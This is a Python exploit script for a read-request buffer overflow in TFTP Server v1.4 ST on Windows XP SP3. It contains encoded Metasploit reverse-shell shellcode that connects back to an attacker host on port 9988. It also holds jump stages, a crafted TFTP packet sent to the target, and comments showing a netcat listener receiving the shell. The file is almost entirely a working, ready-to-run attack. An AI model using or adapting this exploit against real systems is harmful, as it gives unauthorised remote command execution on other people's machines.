#!/usr/bin/python

#---------------------------------------------------------------------------#
# Exploit: TFTP SERVER V1.4 ST (RRQ Overflow)                               #
# OS: Windows XP PRO SP3                                                    #
# Author: b33f                                                              #
#---------------------------------------------------------------------------#
# Smashing the stack for fun and practise...                                #
#                                                                           #
# This tftp service have been pwned extensively:                            #
# (1) Muts ==> WRQ Overflow                                                 #
#     http://www.exploit-db.com/exploits/5314/                              #
# (2) Molotov ==> WRQ Overflow                                              #
#     http://www.exploit-db.com/exploits/10542/                             #
# (3) tixxDZ ==> ERROR Overflow                                             #
#     http://www.exploit-db.com/exploits/5563/                              #
#                                                                           #
# Vulnerable software:                                                      #
# http://www.exploit-db.com/application/5314/                               #
#---------------------------------------------------------------------------#
# After some simple fuzzing with spike I discovered that sending a Read     #
# Request (RRQ) packet can also trigger a buffer overflow...                #
#---------------------------------------------------------------------------#
# It might take up to 30 seconds for some reason but the shell does appear  #
# as expected....                                                           #
#                                                                           #
# root@bt:~# nc -lvp 9988                                                   #
# listening on [any] 9988 ...                                               #
# 192.168.111.128: inverse host lookup failed: Unknown server error         #
# connect to [192.168.111.132] from (UNKNOWN) [192.168.111.128] 1072        #
# Microsoft Windows XP [Version 5.1.2600]                                   #
# (C) Copyright 1985-2001 Microsoft Corp.                                   #
#                                                                           #
# C:\Program Files\TFTPServer>                                              #
#---------------------------------------------------------------------------#

import socket
import sys

host = '192.168.111.128'
port = 69

try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      
except:
      print "socket() failed"
      sys.exit(1)

#msfpayload windows/shell_reverse_tcp LHOST=192.168.111.132 LPORT=9988 R| msfencode -b '\x00'
#x86/shikata_ga_nai succeeded with size 341 (iteration=1)
shell = (
"\xbb\x3c\xef\xdb\xc5\xdb\xdd\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x4f\x31\x5a\x14\x83\xc2\x04\x03\x5a\x10\xde\x1a\x27\x2d\x97"
"\xe5\xd8\xae\xc7\x6c\x3d\x9f\xd5\x0b\x35\xb2\xe9\x58\x1b\x3f"
"\x82\x0d\x88\xb4\xe6\x99\xbf\x7d\x4c\xfc\x8e\x7e\x61\xc0\x5d"
"\xbc\xe0\xbc\x9f\x91\xc2\xfd\x6f\xe4\x03\x39\x8d\x07\x51\x92"
"\xd9\xba\x45\x97\x9c\x06\x64\x77\xab\x37\x1e\xf2\x6c\xc3\x94"
"\xfd\xbc\x7c\xa3\xb6\x24\xf6\xeb\x66\x54\xdb\xe8\x5b\x1f\x50"
"\xda\x28\x9e\xb0\x13\xd0\x90\xfc\xff\xef\x1c\xf1\xfe\x28\x9a"
"\xea\x75\x43\xd8\x97\x8d\x90\xa2\x43\x18\x05\x04\x07\xba\xed"
"\xb4\xc4\x5c\x65\xba\xa1\x2b\x21\xdf\x34\xf8\x59\xdb\xbd\xff"
"\x8d\x6d\x85\xdb\x09\x35\x5d\x42\x0b\x93\x30\x7b\x4b\x7b\xec"
"\xd9\x07\x6e\xf9\x5b\x4a\xe7\xce\x51\x75\xf7\x58\xe2\x06\xc5"
"\xc7\x58\x81\x65\x8f\x46\x56\x89\xba\x3e\xc8\x74\x45\x3e\xc0"
"\xb2\x11\x6e\x7a\x12\x1a\xe5\x7a\x9b\xcf\xa9\x2a\x33\xa0\x09"
"\x9b\xf3\x10\xe1\xf1\xfb\x4f\x11\xfa\xd1\xf9\x16\x6d\x1a\x51"
"\xf7\xea\xf2\xa0\x07\xd4\x06\x2c\xe1\x70\x17\x78\xba\xec\x8e"
"\x21\x30\x8c\x4f\xfc\xd0\x2d\xdd\x9b\x20\x3b\xfe\x33\x77\x6c"
"\x30\x4a\x1d\x80\x6b\xe4\x03\x59\xed\xcf\x87\x86\xce\xce\x06"
"\x4a\x6a\xf5\x18\x92\x73\xb1\x4c\x4a\x22\x6f\x3a\x2c\x9c\xc1"
"\x94\xe6\x73\x88\x70\x7e\xb8\x0b\x06\x7f\x95\xfd\xe6\xce\x40"
"\xb8\x19\xfe\x04\x4c\x62\xe2\xb4\xb3\xb9\xa6\xc5\xf9\xe3\x8f"
"\x4d\xa4\x76\x92\x13\x57\xad\xd1\x2d\xd4\x47\xaa\xc9\xc4\x22"
"\xaf\x96\x42\xdf\xdd\x87\x26\xdf\x72\xa7\x62")

#---------------------------------------------------------------------------#
# (1) Stage1: 0x00409605 TFTPServer.exe - PPR                               #
#             => 3-byte overwrite using the mandatory protocol null-byte.   #
# (2) Stage2: jump back 5-bytes "\xEB\xF9" so we have room for a far jump.  #
# (3) Stage3: jump back 1490-bytes to the beginning of our buffer.          #
# (4) Stage4: reverse shell port 9988 - size 341                            #
#---------------------------------------------------------------------------#

stage4 = "\x90"*50 + shell
stage3 = "\xE9\x2E\xFA\xFF\xFF"
stage2 = "\xEB\xF9\x90\x90"
stage1 = "\x05\x96\x40"

filename = stage4 + "A"*(1487-len(stage4)) + stage3 + stage2 + stage1


mode = "netascii"
youlose = "\x00\x01" + filename + "\x00" + mode + "\x00"
s.sendto(youlose, (host, port))